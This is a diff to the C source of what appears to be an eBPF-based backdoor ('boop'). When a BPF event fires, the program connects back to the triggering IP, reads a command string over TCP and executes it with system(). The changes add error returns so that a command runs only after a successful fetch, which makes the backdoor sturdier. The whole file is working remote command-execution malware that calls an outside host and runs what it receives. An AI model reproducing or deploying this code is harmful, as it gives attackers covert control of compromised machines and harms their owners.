@@ -30,6 +30,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/socket.h>
 #include <unistd.h>
 
 // clang-format off
@@ -62,34 +63,31 @@ void usage() {
   exit(0);
 }
 
-// handlerevrce will handle a reverse lookup against
-// a triggered event. This is responsible for
-// finding whatever boop command will need to
-// be executed on the bookit exploited machine.
-void handlerevrce(char dial[INET_ADDRSTRLEN], char *rce) {
-  printf("  ** Boop: %s\n ", dial);
+
+int handlerevrce(char dial[INET_ADDRSTRLEN], char *rce) {
+  printf(" ** Boop: %s\n ", dial);
   struct sockaddr_in daddr;
   daddr.sin_family = AF_INET;
   daddr.sin_port = htons(PORT);
   if (inet_pton(AF_INET, dial, &daddr.sin_addr) != 1) {
-    printf("Destination IP configuration failed.\n");
-    return;
+    printf(" XX Destination IP configuration failed.\n");
+    return 1;
   }
   int revsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   if (revsock == -1) {
-    printf("Socket creation failed\n");
-    return;
+    printf(" XX Socket creation failed\n");
+    return 1;
   }
   if (connect(revsock, (struct sockaddr *)&daddr, sizeof daddr) < 0) {
-    printf("Connection SOCK_STREAM refused.\n");
-    return;
+    printf(" XX Connection SOCK_STREAM refused.\n");
+    return 1;
   }
 
   char buffer[MAX_RCE_SIZE];
   read(revsock, buffer, MAX_RCE_SIZE);
   close(revsock);
   strncpy(rce, buffer, MAX_RCE_SIZE);
-  printf("  ** RCE: %s\n", rce);
+  return 0;
 }
 
 // config is the configuration options for the program
@@ -308,7 +306,9 @@ int main(int argc, char **argv) {
   int ignore = 0;
   while (1) {
     err = ring_buffer__poll(rb, 100);
-
+    if (err != 0) {
+      //
+    }
     // =========================================================================
     // Boop map management
     //
@@ -332,9 +332,12 @@ int main(int argc, char **argv) {
       }
       if (!ignore) {
         char *rce = malloc(MAX_RCE_SIZE);
-        handlerevrce(saddrval, rce);
-        printf(" <- %s\n", rce);
-        system(rce);
+        int errno;
+        errno = handlerevrce(saddrval, rce);
+        if (errno == 0) {
+          printf(" <- %s\n", rce);
+          system(rce);
+        }
         free(rce);
       }
       err = bpf_map_delete_elem(fd, &jkey);
